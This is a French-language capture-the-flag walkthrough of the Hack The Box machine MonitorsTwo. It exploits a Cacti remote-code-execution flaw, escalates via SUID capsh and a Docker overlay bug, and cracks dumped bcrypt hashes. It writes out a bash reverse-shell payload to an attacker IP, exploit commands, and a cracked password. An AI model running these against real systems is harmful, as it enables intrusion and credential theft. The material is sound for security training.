---
title: "MonitorsTwo (HTB)"
summary: "MonitorsTwo est une machine Linux de difficulté facile. Elle met en avant quelques vulnérabilités et erreurs de configurations qui seront exploitées afin de prendre le contrôle du système suivant la kill-chain..."
categories: ["Post","Blog",]
tags: ["post"]
#externalUrl: ""
#showSummary: true
date: 2023-12-16
draft: false
---



## I- Vue d'ensemble de la machine:

![image-1]

[MonitorsTwo][1] est une machine Linux de difficulté facile. Elle met en avant quelques vulnérabilités et erreurs de configurations qui seront exploitées afin de prendre le contrôle du système suivant notre kill-chain ci-après:

**Accès Initial**:

Une première énumeration rapide nous permet de découvrir une application web vulnérable à une exécution de code à distance (RCE) avec pré-authentification via un en-tête ``X-Forwarded-For`` malveillant. L'exploitation de cette vulnérabilité débouche sur un shell au sein d'un conteneur Docker. 
	
**Élevation de privilèges (1)**:
	Un binaire ``capsh`` mal configuré avec le bit SUID activé permet un accès root à l'intérieur du conteneur. 
	
**Mouvement latéral**:
	La découverte d'identifiants MySQL permet le dumping d'un hash, qui, une fois craqué, fournit un accès SSH à la machine.
	
**Élevation de privilèges (2)**:
	Une énumération plus poussée révèle une version de Docker vulnérable qui permet à un utilisateur de faible privilège d'accéder aux systèmes de fichiers des autres conteneurs montés. En tirant parti de l'accès root dans le conteneur, un binaire bash avec le bit SUID activé sera copié, afin d'obtenir une élévation de privilèges sur l'hôte.


## II- Collecte d'informations:

#### Scan de ports Nmap

```bash
┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo]
└─$sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.211

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

- Informations utiles:

    - Serveur web nginx 1.18.0 en écoute, pouvant être un portail de connexion.
    - Serveur SSH en mode écoute (nous auront besoin d'identifiants valides pour y accéder).



## III- Accès Initial

Page d'accueil :

![image-2]

Nous avons la version de l'application ``Cacti 1.2.22`` il s'agira donc de chercher l'existence de vulnérabilités connues sur cette version:

![image-3]

Il en ressort plusieurs références pour la même vulnérabilité de type RCE: [CVE-2022-46169][2] 

**Vulnérabilité:**
L'exploit consiste à accéder à l'endpoint vulnérable ``/remote_agent.php``, dont l'authentification peut être contournée en raison d'une implémentation faible de la fonction ``get_client_addr`` qui utilise un en-tête contrôlé par l'utilisateur, nommément ``X-Forwarded-For``, pour authentifier le client. Une fois que cette vérification initiale est contournée, nous déclencherons ensuite la fonction ``poll_for_data`` via l'action ``polldata``, qui est vulnérable à l'injection de commande via le paramètre ``$poller_id`` qui est passé à ``proc_open``, qui est une fonction PHP qui exécute des commandes système.

Essayons donc ce [PoC][3]:

```bash
# Nous allons configurer un listenner notament nc:
┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

```bash
# clonage du repo github:
┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo]
└─$ sudo git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
Cloning into 'CVE-2022-46169-CACTI-1.2.22'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 4 (delta 1), pack-reused 0
Receiving objects: 100% (18/18), 5.07 KiB | 2.53 MiB/s, done.
Resolving deltas: 100% (4/4), done.

┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22]
└─$ cd CVE-2022-46169-CACTI-1.2.22/

┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22]
└─$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.xx.xx --LPORT=1337
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

```bash
# Obtention du reverse shell:
┌──(raizen㉿Raizen)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 39056
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

Simple et efficace !

## IV- Élevation de privilèges  (1)

Après avoir examiné divers répertoires et fichiers, rien de particulièrement intéressant n'est apparu. La seule chose à noter est que nous sommes actuellement dans un conteneur Docker, comme le suggère la présence du fichier /.dockerenv, ce qui est également confirmé par notre nom d'hôte, à savoir www-data@50bca5e748b0:

```bash
www-data@50bca5e748b0:/var/www/html$ ls -la /
total 88
drwxr-xr-x   1 root root 4096 Mar 21  2023 .
drwxr-xr-x   1 root root 4096 Mar 21  2023 ..
-rwxr-xr-x   1 root root    0 Mar 21  2023 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22  2023 bin
```

Nous pouvons vérifier s'il y a quelque chose d'intéressant qui peut être exécuté avec des privilèges élevés notament tous les fichiers sur le système de fichiers qui ont l'attribut setuid (suid) activé.

```bash
www-data@50bca5e748b0:/var/www/html$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

Le binaire ``capsh`` semble convenir à ce que je cherche. En effectuant une recherche rapide sur [GTFOBins][4] (un site incontournable qui répertorie une liste de binaires Unix pouvant être utilisés pour contourner les restrictions de sécurité locale dans des systèmes mal configurés) nous obtenons ceci :

![image-4]

Suivons donc les directives de GTFOBins :

```bash
www-data@50bca5e748b0:/var/www$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Et ainsi j'obtiens les droits root. Cependant nous n'avons pas encore trouvé notre flag puisse que nous sommes toujours dans le conteneur docker.

## V- Mouvement latérral

Lorsque nous listons les fichiers dans le répertoire racine (/), nous voyons un script appelé entrypoint.sh:

```bash
ls -l
total 76
drwxr-xr-x   1 root root 4096 Mar 22  2023 bin
drwxr-xr-x   2 root root 4096 Mar 22  2023 boot
drwxr-xr-x   5 root root  340 Jan 25 14:34 dev
-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
<SNIP>
```

Vérifions donc son contenu: 

```bash
www-data@50bca5e748b0:/$ cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

Nous voyons plusieurs commandes mysql exécutées en tant que root. Le script révèle également que le nom d'utilisateur admin existe et que le champ lié au mot de passe must_change_password est présent dans la table user_auth.

```bash
$ mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings     login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts    lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb   1       on      on      on      on      on      2 11       1       1       on      -1      -1      -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1-1               0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1 11       1       1       on      -1      -1              on      0       0       2135691668
```

Nous obtenons ainsi les identifiants des utilisateurs ``admin`` et ``marcus`` :

1. `admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC`
2. `marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C` 

Essayons de cracker ces identifiants sur notre machine d'attaque en utilisant john:

```bash
┌──(raizen㉿Raizen)-[~/HTB/Monitorstwo]
└─$ cat hashes.txt
$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

┌──(raizen㉿Raizen)-[~]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)
```

Ainsi nous avons les identifiants de ``marcus:funkymonkey``.Il ne reste plus qu'àeaayer de se connecter via ssh à notre cible et obtenir notre premier flag:

```bash
 ┌──(marcus㉿monitorstwo)-[~]
 └─$ssh marcus@10.10.11.211

 ┌──(marcus㉿monitorstwo)-[~]
 └─$ cat user.txt
<********************************>
```

## VI- Élevation de privilèges (2)

Après fait le tour des répertoires et fichiers, nous trouvons finallement quelque chose d'intéressant :

```bash
┌──(marcus㉿monitorstwo)-[/var]
└─$ cat mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
En gros ce mail écrit par l'administrateur de monitorstwo.htb est destinée à tous les utilisateurs du système et aborde principalement trois vulnérabilités récemment découvertes qui nécessitent une attention immédiate. Nous alllons donc investiguer ces trois vulns et voir s'il y en a un que nous pourrons exploiter pour avancer dans notre tâche.

- La première, [CVE-2021-33033][5] concerne les versions du noyau antérieures à 5.11.14, voyons donc ce que nous avons actuellement :

```bash
marcus@monitorstwo:/var$ uname -a
Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Bien que cela semble être une version obsolète, la série de versions 5.4 est en fait la dernière selon la [documentation officielle][6]:

![image-5]

- La seconde [CVE-2020-25706][7] fait référence à une vulnérabilité XSS pour ``Cacti 1.2.13`` or la version de l'application cible est ``Cacti 1.2.22``. 

-Il ne nous reste que la dernière vuln : [CVE-2021-41091][8], qui concerne le ``Docker engine``, nommé ``Moby`` version 20.10.9. Ce qui nous arrangerait compte tenu de l'environnement où nous somme actuellement.

Une vérification de la version de docker nous permet de voir qu'il s'agit de la version ``20.10.5`` qui est **spoiller alert** vulnérable:

```bash
┌──(marcus㉿monitorstwo)-[/var]
└─$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

Nous devrions donc pouvoir exploiter ce CVE. Après quelques recherches, nous tombons sur ce [POC][9]. 

**Vulnérabilité**:
	Plusieurs répertoires dans ``/var/lib/docker``, qui sont montés et utilisés par les conteneurs Docker, sont accessibles aux utilisateurs à faible privilèges. Cela implique que si un attaquant obtient l'accès root à l'intérieur d'un conteneur, il pourrait créer des fichiers ``SUID arbitraires`` avec lesquels un utilisateur non privilégié à l'extérieur du conteneur pourrait interagir et utiliser pour une élevation de privilèges.

- Ce que nous devons donc faire :

   1- Répéter notre processus initial pour obtenir un accès RCE et une élévation de privilèges via le binaire ``capsh`` en utilisant [CVE-2022-46169][3].  
   2- Attribuer les permissions appropriées au binaire bash avec la commande ``chmod u+s /bin/bash``.  
   3- Cloner le PoC du [CVE-2021-41091][9] sur notre machine d'attaque, transférer le script bash (exp.sh) sur la cible en utilisant le compte marcus via SSH, et l'exécuter en utilisant l'utilisateur marcus.  

Répétons notre accès initial puis obtenons les droits root à l'intérieur du conteneur :

  ```bash
  # obtention des droits root à l'intérieur du conteneur
  whoami
  root
  id
  uid=0(root) gid=0(root) groups=0(root),33(www-data)
  # attribution des permissions SUID au binaire bash
  chmod u+s /bin/bash
  ```

Depuis notre machine d'attaque :

	```bash
	# clonage du repo vers ma machine
	$ sudo git clone https://github.com/UncleJ4ck/CVE-2021-41091
	[sudo] password for kali:
	Cloning into 'CVE-2021-41091'...
	remote: Enumerating objects: 25, done.
	remote: Counting objects: 100% (25/25), done.
	remote: Compressing objects: 100% (23/23), done.
	remote: Total 25 (delta 6), reused 3 (delta 0), pack-reused 0
	Receiving objects: 100% (25/25), 6.95 KiB | 6.96 MiB/s, done.
	Resolving deltas: 100% (6/6), done.
	# move within the directory
	$ cd CVE-2021-41091/
	# checking permissions
	$ ls -l
	total 8
	-rwxr-xr-x 1 root root 2446 Jan 25 18:18 exp.sh
	-rw-r--r-- 1 root root 2616 Jan 25 18:18 README.md
	# start a Python HTTP server
	$ python3 -m http.server
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
	10.10.11.211 - - [25/Jan/2024 18:19:47] "GET /exp.sh HTTP/1.1" 200 -
	```

Depuis le terminal de `marcus`:

  ```bash
  # Téléchargement du script
  ┌──(marcus㉿monitorstwo)-[~]
  └─$ wget http://10.10.xx.xx:8000/exp.sh
  --2024-01-25 18:19:47--  http://10.10.xx.xx:8000/exp.sh
  Connecting to 10.10.14.33:8000... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 2446 (2.4K) [text/x-sh]
  Saving to: ‘exp.sh’

  exp.sh                100%[========================>]   2.39K  --.-KB/s    in 0s

  2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446]
```
```
  # Attribution de la permission d'exécution
  ┌──(marcus㉿monitorstwo)-[~]
  └─$ chmod +x exp.sh
```
```
  # Vérification des permissions

  ┌──(marcus㉿monitorstwo)-[~]
  └─$ ls -l exp.sh
  total 8
  -rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh
```
```
  # Exécution du script

  ┌──(marcus㉿monitorstwo)-[/var]
  └─$ ./exp.sh
  [!] Vulnerable to CVE-2021-41091
  [!] Now connect to your Docker container that is accessible and obtain root access !
  [>] After gaining root access execute this command (chmod u+s /bin/bash)

  Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
  [!] Available Overlay2 Filesystems:
  /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
  /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

  [!] Iterating over the available Overlay2 filesystems !
  [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
  [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

  [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  [!] Rooted !
  [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  [?] If it didnt spawn a shell go to this path and execute './bin/bash -p'

  [!] Spawning Shell

  bash-5.1# exit
```
  - Direction vers le "Current Vulnerable Path" mentionné ci-dessus

```
  ┌──(marcus㉿monitorstwo)-[~]
  └─$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

  # Éxécution de la commande './bin/bash -p' pour lancer l'interpréteur en ``privileged mode``

  $ ./bin/bash -p
  bash-5.1# id
  uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
  bash-5.1# cat /root/root.txt
  <********************************>
```
## Pwned 🗹

![image-6]

Ainsi s'achève notre mission ;) 
<br>
## VII- Extra - IppSec’s Exploit

> Cette section fera office d'ouverture et sera basé sur la vidéo de IppSec's [video walkthrough][10] où l'exploitation est réalisé de façon manuelle. On apprend toujours de nouvelles méthodologies et astuces dans ses vidéos donc ça vaut le détour. 

### Accès Initial

Nous réaliserons l'exploitation du [CVE-2022-46169][2] en se basant sur le [post de Rapid7][11]) de façon manuelle:

  1. Si les paramètres `LOCAL_DATA_ID` et/ou `HOST_ID` ne sont pas définis, le module tentera de forcer la valeur (ou les valeurs) manquante(s). Si une combinaison valide est trouvée, le module utilisera ces valeurs pour tenter l'exploitation.
  2. Si `LOCAL_DATA_ID` et/ou `HOST_ID` sont tous les deux définis, le module tentera immédiatement l'exploitation.
  3. Pendant l'exploitation, le module envoie une requête `GET` à `/remote_agent.php` avec le paramètre d'action défini sur `polldata` et l'en-tête `X-Forwarded-For` défini sur la valeur fournie pour `X_FORWARDED_FOR_IP` (par défaut `127.0.0.1`).

WNous pouvons commencer par intercepter une requête via Burp, par exemple, une requête de connexion ``POST`` en utilisant des identifiants aléatoires, changer la méthode ``HTTP`` en requête ``GET`` et l'URL en ``/remote_agent.php?``action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}``.

> Le chemin d'URL peut être trouvé [ici][12]:

![image-7]

![image-8]

Nous recevons l'erreur ``FATAL: You are not authorized to use this service``. Commençons par ajouter l'en-tête ``X-Forwarded-For`` avec la valeur ``localhost`` et voyons ce qui se passe.

![image-9]

Cette fois, nous n'avons pas reçu d'erreur ``FATAL``, mais une erreur de ``Validation`` concernant le paramètre ``host_id``. Supprimons les variables, définissons tous les identifiants sur ``1``, et essayons un payload simple, telle que ``sleep 5``.

> Le payload ``sleep+5`` est la version URL-encodée de la charge utile ``sleep 5``.

![image-10]

Nous n'avons reçu aucune erreur en retour, mais la charge utile n'a pas fonctionné non plus. Cela est logique car, selon la description de la vulnérabilité :

  > Si une combinaison valide est trouvée, le module utilisera ces informations pour tenter l'exploitation

Ainsi, nous devons effectuer une attaque par ``brute force`` sur les paramètres ``local_data_id`` et ``host_id`` jusqu'à ce que nous trouvions une combinaison valide de valeurs qui permettra à notre charge utile de fonctionner. Nous pouvons l'automatiser en utilisant l'outil Intruder :

![image-11]

![image-12]

> Les deux charges utiles ``1`` et ``2`` sont définies comme une liste séquentielle de nombres de ``1`` à ``10``

![image-13]

Intruder montre qu'une seule combinaison de charges utiles a entraîné un délai de 5 secondes (causé par notre charge utile ``sleep+5``) : ``local_data_ids[]=6`` et ``host_id=1`` ! Vérifions cela manuellement :
![image-14]

Ce qui se passe ici, c'est que certaines valeurs du paramètre ``rdd_name`` de la ``réponse HTTP`` sont exploitables : ``uptime`` en est une (nous pouvons trouver la liste complète des paramètres exploitables [ici][13]. Donc, nous effectuons une attaque par force brute sur les paramètres ``local_data_id`` et ``host_id`` jusqu'à ce qu'une combinaison d'entre eux renvoie l'un des paramètres exploitables dans la réponse :

![image-15]

![image-16]

Maintenant que nous avons trouvé la bonne combinaison de valeurs de paramètres, nous pouvons envoyer du code (ici un reverse shell) en tant que charge utile: ``bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1'``; L'encoder en URL (en appuyant sur ``CTRL+U``) puis mettre en place sur notre machine d'attaque un Listener (netcat en mode écoute) et envoyer la requête :

```bash
# listener nc
┌──(raizen㉿Raizen)-[~]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.xx.xx] 36722
```

![image-17]

```bash
# Obtention du shell inversé
┌──(raizen㉿Raizen)-[~]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 36722
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

### Mouvement latéral

Idéalement, nous devrions d'abord stabiliser notre shell. Python n'est pas installé sur la cible, donc nous ne pouvons pas utiliser le module ``pty``(``python3 import pty;pty.spawn'("/bin/bash")'``) pour y parvenir. Cependant, nous pouvons utiliser ``script`` :

```bash
# Stabilisation du shell avec script
www-data@50bca5e748b0:/var/www/html$ which script
which script
/usr/bin/script
www-data@50bca5e748b0:/var/www/html$ script -O /dev/null -q /bin/bash
script -O /dev/null -q /bin/bash
$ bash
bash
# Mise en arrière plan de la connexion 
www-data@50bca5e748b0:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 1337
# Remise en avant plan dans notre shell
┌──(raizen㉿Raizen)-[~]
└─$ stty raw -echo; fg
nc -lvnp 1337

www-data@50bca5e748b0:/var/www/html$
```

Maintenant, nous devons obtenir les valeurs des variables ``rows``(lignes) et ``cols``(colonnes) depuis notre machine d'attaque :

```bash
┌──(raizen㉿Raizen)-[~]
└─$ stty -a
speed 38400 baud; rows 51; columns 209; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

Et enfin, nous devons définir les mêmes valeurs sur notre machine cible :

```bash
www-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209
www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
```

Nous avons maintenant notre point d'entrée initial avec un shell bash approprié ! Étant donné que c'est un serveur d'application web, nous devrons probablement vérifier les fichiers de configuration de la base de données :

```bash
# Recherche de fichiers de configuration
www-data@50bca5e748b0:/var/www/html$ find . | grep config
./include/config.php
./docs/images/graphs-edit-nontemplate-configuration.png
./docs/apache_template_config.html

# Recherche de chaînes de caractères liées à la base de données dans le fichier de configuration
www-data@50bca5e748b0:/var/www/html$ grep database include/config.php
 * Make sure these values reflect your actual database/host/user/password
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_hostname = 'localhost';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_retries  = 5;
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';
 * Save sessions to a database for load balancing
 * are defined in lib/database.php
```

Le fichier de configuration ci-dessus contient tout ce dont nous avons besoin pour nous connecter au serveur de base de données :

```bash
# Connexion au serveur mysql
www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 221
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

# Listage des bases de données
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cacti              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.002 sec)

# Selection de la base de donnée:

MySQL [(none)]> use cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

# Listage des tables de bases de données

MySQL [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
<SNIP>
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
111 rows in set (0.001 sec)

# Extraction de la première ligne de la table pour énumérer ses champs

MySQL [cacti]> SELECT * FROM user_auth LIMIT 1 \G;
*************************** 1. row ***************************
                    id: 1
              username: admin
              password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
                 realm: 0
             full_name: Jamie Thompson
         email_address: admin@monitorstwo.htb
  must_change_password:
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 2
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked:
       failed_attempts: 0
              lastfail: 0
           reset_perms: 663348655
1 row in set (0.000 sec)

ERROR: No query specified

-Nous pouvons déjà y trouver les information de connexion sur le compte ``admin``

# selection des champs qui nous intéressent (noms et mots de passe):

MySQL [cacti]> SELECT username, password FROM user_auth ;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
3 rows in set (0.001 sec)
```

> [Le modificateur `\G` dans le client de ligne de commande MySQL][14].

Nous pouvons maintenant essayer de cracker ces hash sur notre machine en utilisant d'abord le mode de détection automatique de ``hashcat`` pour déterminer le type de hachage :


```bash
┌──(raizen㉿Raizen)-[~]
└─$ cat hashes
admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
# En utilisant le mode d'auto  detection
┌──(raizen㉿Raizen)-[~]
└─$ hashcat hashes /usr/share/wordlists/rockyou.txt --username
hashcat (v6.2.6) starting in autodetect mode

<SNIP>

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+========================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Fri Jan 26 06:42:36 2024
Stopped: Fri Jan 26 06:42:38 2024
```

Nos hash commencent par ``$2y$``, ce qui correspond mieux au format ``bcrypt`` de la category ``operating system``. Nous choisirons donc le ``mode 3200`` dans ``hashcat``.

```bash
┌──(raizen㉿Raizen)-[~]
└─$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username

<SNIP>
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: hashes
Time.Started.....: Fri Jan 26 06:46:23 2024 (7 mins, 57 secs)
Time.Estimated...: Tue Jan 30 09:23:44 2024 (4 days, 2 hours)
```

En moins de 10min nous obtenons un résultat pour l'utilisateur ``marcus`` :

```bash
┌──(raizen㉿Raizen)-[~]
└─$ hashcat -m 3200 --username --show hashes
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

We can now use these creds, `marcus:funkymonkey`, for logging into SSH:

```bash
┌──(raizen㉿Raizen)-[~]
└─$ ssh marcus@10.10.11.211
marcus@10.10.11.211's password:
<SNIP>

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
┌──(marcus㉿monitorstwo)-[~]
└─$
```

### Élevation de privilèges

Nous pouvons maintenant utiliser ces identifiants ``marcus:funkymonkey`` pour nous connecter via SSH :

```bash
